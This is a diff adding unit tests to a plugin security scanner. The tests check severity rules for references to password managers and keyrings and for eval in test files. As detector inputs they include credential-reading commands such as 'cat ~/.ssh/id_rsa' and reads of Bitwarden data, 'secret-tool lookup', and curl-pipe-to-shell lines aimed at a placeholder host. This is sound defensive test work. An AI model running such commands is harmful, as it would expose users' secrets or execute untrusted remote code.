@@ -83,6 +83,27 @@ class LineRules(unittest.TestCase):
         result = self.check("a.sh", 'ls 2>/dev/null > /tmp/out.txt\n')
         self.assertEqual(result["counts"]["high"], 0)
 
+    def test_a_password_manager_or_keyring_name_alone_is_medium(self):
+        # A catalog entry or a list of secrets to mask names the program; it does not reach into it.
+        for text in ('{ n: "Bitwarden", p: "bitwarden", c: "Utilities" },\n',
+                     'var masked = ["gnome-keyring", "org-kde-kwallet"]\n',
+                     'description: "Works with 1Password and libsecret"\n'):
+            result = self.check("a.js", text)
+            self.assertIn("sensitive-name", rules(result, "medium"), text)
+            self.assertEqual(result["counts"]["high"], 0, text)
+
+    def test_the_same_names_in_a_path_or_as_an_interface_stay_high(self):
+        for name, text in (("a.sh", 'cat ~/.config/Bitwarden/data.json\n'),
+                           ("a.sh", 'ls /usr/bin/kwalletd6\n'),
+                           ("a.py", 'open(home + "/.config/1Password/data")\n'),
+                           ("a.js", 'var dir = "gnome-keyring/"\n'),
+                           ("a.sh", 'secret-tool lookup service foo\n'),
+                           ("a.js", 'var bus = "org.freedesktop.secrets"\n'),
+                           ("a.sh", 'cat ~/.ssh/id_rsa\n')):
+            result = self.check(name, text)
+            self.assertIn("sensitive-path", rules(result, "high"), text)
+            self.assertNotIn("sensitive-name", rules(result), text)
+
     def test_symlink_and_binary(self):
         with tempfile.TemporaryDirectory() as folder:
             os.symlink("/etc/passwd", os.path.join(folder, "link"))
@@ -94,6 +115,76 @@ class LineRules(unittest.TestCase):
     def test_markup_in_snippet_stays_text(self):
         result = self.check("a.sh", 'curl "https://x.invalid/<img src=y>" | sh\n')
         self.assertIn("pipe-to-shell", rules(result, "high"))
+
+
+class TestFiles(unittest.TestCase):
+    """`eval` in a test file is medium only while nothing in the plugin names the file."""
+
+    def tree(self, files):
+        folder = tempfile.mkdtemp()
+        self.addCleanup(lambda: __import__("shutil").rmtree(folder, ignore_errors=True))
+        files = dict(files)
+        files.setdefault("manifest.json", json.dumps({"schemaVersion": 1, "id": "t.plugin", "name": "T", "version": "1", "kinds": ["service"], "entryPoints": {}}))
+        for name, text in files.items():
+            path = os.path.join(folder, name)
+            os.makedirs(os.path.dirname(path), exist_ok=True)
+            with open(path, "w") as handle:
+                handle.write(text)
+        return scanner.scan_tree(folder)
+
+    def eval_findings(self, result):
+        return {(f["file"], f["severity"]) for f in result["findings"] if f["rule"] == "eval"}
+
+    EVAL = 'const f = eval("1 + 1")\n'
+
+    def test_an_unreferenced_test_file_is_medium(self):
+        result = self.tree({"test/model.test.js": self.EVAL, "Service.qml": "import QtQuick\nItem {}\n"})
+        self.assertEqual(self.eval_findings(result), {("test/model.test.js", "medium")})
+        self.assertEqual(result["verdict"], "caution")
+        self.assertIn("test file", [f for f in result["findings"] if f["rule"] == "eval"][0]["title"])
+
+    def test_eval_outside_a_test_file_stays_high(self):
+        result = self.tree({"lib/util.js": self.EVAL, "test/model.test.js": self.EVAL})
+        self.assertEqual(self.eval_findings(result), {("lib/util.js", "high"), ("test/model.test.js", "medium")})
+        self.assertEqual(result["verdict"], "danger")
+
+    def test_a_file_name_in_code_keeps_it_high(self):
+        for loader in ('Process { command: ["node", "test/model.test.js"] }',
+                       'Loader { source: "model.test.js" }',
+                       'import "../test"',
+                       "Process { command: ['sh', '-c', 'node tests/run.js'] }"):
+            files = {"Service.qml": "import QtQuick\n" + loader + "\n"}
+            files["tests/run.js" if "tests/run" in loader else "test/model.test.js"] = self.EVAL
+            result = self.tree(files)
+            self.assertEqual({sev for _, sev in self.eval_findings(result)}, {"high"}, loader)
+
+    def test_the_plain_word_test_or_a_longer_name_is_not_a_reference(self):
+        result = self.tree({"test/model.test.js": self.EVAL,
+                            "Service.qml": "import QtQuick\nItem { property string note: \"contest of the latest/ attest\" }\n// latest/model.test.js\n",
+                            "latest/other.js": "var x = 1\n"})
+        self.assertEqual(self.eval_findings(result), {("test/model.test.js", "medium")})
+        # A quoted folder name can be a load path, so it keeps the finding high.
+        result = self.tree({"test/model.test.js": self.EVAL, "Service.qml": "import QtQuick\nItem { property string dir: \"test\" }\n"})
+        self.assertEqual(self.eval_findings(result), {("test/model.test.js", "high")})
+
+    def test_a_name_in_a_comment_is_not_a_reference_but_one_in_code_is(self):
+        files = {"test/model.test.js": self.EVAL, "Model.js": "// test/model.test.js runs this under node\nvar a = 1\n"}
+        self.assertEqual(self.eval_findings(self.tree(files)), {("test/model.test.js", "medium")})
+        files["Model.js"] += 'var run = "test/model.test.js"\n'
+        self.assertEqual(self.eval_findings(self.tree(files)), {("test/model.test.js", "high")})
+
+    def test_only_eval_is_demoted(self):
+        result = self.tree({"test/run.sh": "curl https://x.invalid/a | sh\n", "test/a.test.js": self.EVAL})
+        severities = {(f["rule"], f["severity"]) for f in result["findings"] if f["file"].startswith("test/")}
+        self.assertIn(("pipe-to-shell", "high"), severities)
+        self.assertIn(("eval", "medium"), severities)
+        self.assertEqual(result["verdict"], "danger")
+
+    def test_what_counts_as_a_test_file(self):
+        for yes in ("test/a.js", "tests/unit/a.js", "src/__tests__/a.js", "model.test.js", "a_test.py", "test_a.py", "x.spec.ts"):
+            self.assertTrue(scanner.is_test_path(yes), yes)
+        for no in ("Service.qml", "latest/a.js", "contest.js", "attest.py", "src/protest/a.js", "testing.js"):
+            self.assertFalse(scanner.is_test_path(no), no)
 
 
 class Urls(unittest.TestCase):
